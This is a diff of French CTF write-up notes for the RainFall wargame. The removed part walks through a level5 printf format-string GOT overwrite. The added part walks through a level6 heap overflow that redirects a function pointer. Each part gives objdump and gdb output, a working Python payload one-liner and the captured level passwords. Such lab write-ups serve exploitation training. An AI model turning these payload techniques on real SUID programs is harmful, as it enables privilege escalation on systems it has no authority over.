@@ -1,49 +1,46 @@
-Connextion au level5 -> Bit NX desactive
-Chech du home et des permissions du binaire -> Bit SUID level6
-Exection du binaire -> attente d'ecriture sur l'entree standard et reaffichage de la chaine sur la sortie (echo like)
-
-"""
-level5@Rainfaill:~$ ./level5
-abc
-abc
-"""
+Connextion au level6 -> Bit NX desactive
+Chech du home et des permissions du binaire -> Bit SUID level7
+Exection du binaire sans argument -> SegV
+Exection du binaire avec -> "Nope"
 
 Reecriture du code source en utilisant objdump -d et gdb avec peda
 
-Fonction "o" appelant "system(/bin/sh)" mais pas appele dans les fonctions precedentes
+on voit qu'une fonction 'n' appelle la commande "system("/bin/cat /home/user/level7/.pass")"
 
-printf exploitable de la meme maniere qu'au 2 levels precedents
+on se doute qu'il va falloir ecraser le contenu d'une adresse par celle de cette fonction.
 
-Recherche sur google -> "execute function with printf exploit"
--> https://axcheron.github.io/exploit-101-format-strings/
+nous voyons dans le main qu'il y a 2 appel a malloc, le deuxieme est une allocation de pointeur de fonction qui est set plus tard vers la fonction m
 
-objdump -R ./level5
--> 08049838 R_386_JUMP_SLOT   exit
+la premiere alloction est passe en argument en tant que buffer de destination du strcpy, et argv[1] en tant que source
 
-objdump -t ./level5 | grep o
--> 080484a4 g     F .text	0000001e              o
+gdb-peda$ print $eax
+$10 = 0x804a008
 
-Il faut alors ecraser l'adresse pointer par exit par celle de la fonction o afin qu'elle soit executer.
+0x804a008 etant l'adresse de destination du strcpy et le premier malloc, nous pouvons voir sa taille et le contenu des prochaines adresses de cette maniere
 
-Ici on se sert de la largeur des formats de printf pour imprimer des caracteres.
-le 'h' indique que la varible est un short (2 octets), de cette maniere on peut tout ecrire en utilisant 2 adresses seulement
+gdb-peda$ x/30x 0x804a008
+0x804a008:	0x41414141	0x00000000	0x00000000	0x00000000
+0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000
+0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
+0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a078:	0x00000000	0x00000000
 
-0804 in dec = 2052
-84a4 in dec = 33956
+$objdump -t ./level6 | grep m
+08048468 g     F .text	00000014              m
 
-8 caracteres ont deja ete imprime (les 2 adresses), il faut alors les soustraire pour que la valeur ne change pas
+On retrouve 0x08048468, l'adresse de la fonction m. Cette adresse se trouve a l'adresse pointer par le pointeur allouer apres celle du buffer
 
-2052 - 8 = 2044
+Sachant qu'aucun test de longueur sur le buffer n'est effectue, nous pouvons alors ecraser cette adresse par celle de la fonction n
 
-Meme soustraction avec ce qui a ete imprime par la suite
+$objdump -t ./level6 | grep n
+08048454 g     F .text	00000014              n
 
-33956 - 2052 = 31904
+Il y a donc 72 octets prevu pour le buffer donc le payload doit etre
 
-le '4$' permet de remonter la stack de 4 adresses
+72 caracteres + adresses de n
 
-python -c 'print "\x3A\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/z && cat /tmp/z - | ./level5
-id
-uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
-cd /home/user/level6
-cat .pass
-d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
